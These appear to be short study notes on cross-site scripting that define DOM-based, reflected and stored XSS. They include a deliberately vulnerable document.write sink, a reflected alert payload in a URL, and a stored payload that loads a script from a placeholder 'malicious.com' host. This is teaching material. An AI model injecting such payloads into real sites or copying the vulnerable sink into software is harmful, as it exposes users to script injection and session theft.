# XSS payload [cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
### [DOM Based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
The attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser. The payload is passessed to a sink that supports dynamic code execution, such as eval() or innerHTML
```js
<select>
    <script>
    document.write("<OPTION value=1>"+decodeURIComponent(document.location.href.substring(document.location.href.indexOf("default=")+8))+"</OPTION>");
    document.write("<OPTION value=2>English</OPTION>");
    </script>
</select>
```

### [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request
```js
http://example.com/vulnerable.php?user=<script>alert(123)</script>
```

### [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
The victim then retrieves the malicious script from the server when it requests the stored information.
```js
<script src=”http://malicious.com/exploit.js”> </script>
```



